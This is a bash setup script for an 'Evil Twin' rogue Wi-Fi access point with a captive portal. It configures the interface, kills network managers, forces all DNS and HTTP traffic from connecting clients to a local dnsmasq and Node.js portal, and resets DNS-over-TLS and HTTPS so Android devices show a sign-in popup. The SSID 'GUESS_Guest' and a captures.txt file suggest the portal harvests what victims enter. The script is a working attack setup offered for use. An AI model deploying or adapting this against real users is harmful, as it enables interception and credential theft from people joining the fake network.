#!/bin/bash

# Setup script for the Evil Twin captive portal prototype.
# Run once before starting hostapd, dnsmasq and server.js.

IFACE=wlan0      # WiFi adapter used as the access point
INET=eth0        # Interface connected to the real internet
AP_IP=10.0.0.1   # IP address of the AP

# Fix Windows line endings in the config files
sed -i 's/\r//' hostapd.conf dnsmasq.conf
sed -i "s/^interface=.*/interface=$IFACE/" hostapd.conf dnsmasq.conf

# Install Node.js dependencies if missing
if [ ! -d "node_modules" ]; then
    echo "Installing Node.js dependencies..."
    npm install
fi

# Stop NetworkManager so it does not take over wlan0
echo "Stopping NetworkManager..."
sudo systemctl stop NetworkManager
sudo airmon-ng check kill
sudo nmcli dev set $IFACE managed no 2>/dev/null || true

# Assign static IP to the AP interface
echo "Configuring $IFACE with IP $AP_IP..."
sudo ip link set $IFACE up
sudo ip addr flush dev $IFACE
sudo ip addr add $AP_IP/24 dev $IFACE

# Clear any existing iptables rules
echo "Clearing old firewall rules..."
sudo iptables --flush
sudo iptables -t nat --flush
sudo iptables -X 2>/dev/null || true

# Redirect all DNS traffic to our local dnsmasq.
# Without this, clients that use hardcoded DNS (8.8.8.8, Private DNS, etc.)
# would bypass our DNS server.
echo "Redirecting DNS to local dnsmasq..."
sudo iptables -t nat -A PREROUTING -i $IFACE -p udp --dport 53 -j REDIRECT --to-port 53
sudo iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 53 -j REDIRECT --to-port 53

# Redirect HTTP traffic (port 80) to the Node.js server.
# This catches the captive portal HTTP probes from unauthenticated clients
# and sends them to the portal page.
echo "Redirecting HTTP port 80 to Node.js on port 3000..."
sudo iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -j REDIRECT --to-port 3000

# Enable NAT so authorized clients can reach the real internet
echo "Enabling NAT from $IFACE to $INET..."
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
sudo iptables -t nat -A POSTROUTING -o $INET -j MASQUERADE

# Reject DNS-over-TLS (port 853) with a TCP reset so Android falls back to
# normal DNS (which we already redirect to dnsmasq).
sudo iptables -A FORWARD -i $IFACE -p tcp --dport 853 -j REJECT --reject-with tcp-reset
sudo iptables -A FORWARD -i $IFACE -p udp --dport 853 -j REJECT

# Allow return traffic for established connections
sudo iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT

# Reject port 443 with a TCP reset for unauthenticated clients.
# Android's HTTPS probe fails fast and commits to the HTTP probe result,
# which triggers the "Sign in to network" popup right away.
# Authorized clients bypass this rule because server.js inserts a per-IP
# ACCEPT rule at the top of the FORWARD chain.
sudo iptables -A FORWARD -i $IFACE -p tcp --dport 443 -j REJECT --reject-with tcp-reset

# Drop everything else - keeps unauthenticated clients on the portal
sudo iptables -A FORWARD -i $IFACE -j DROP

echo ""
echo "============================================"
echo "  AP interface : $IFACE"
echo "  Internet     : $INET"
echo "  Portal IP    : $AP_IP"
echo "  SSID         : GUESS_Guest"
echo ""
echo "  Next steps (run each in a separate terminal):"
echo "  1. sudo hostapd $(pwd)/hostapd.conf"
echo "  2. sudo dnsmasq -C $(pwd)/dnsmasq.conf -d"
echo "  3. sudo node $(pwd)/server.js"
echo ""
echo "  Captures file: $(pwd)/captures.txt"
echo "============================================"
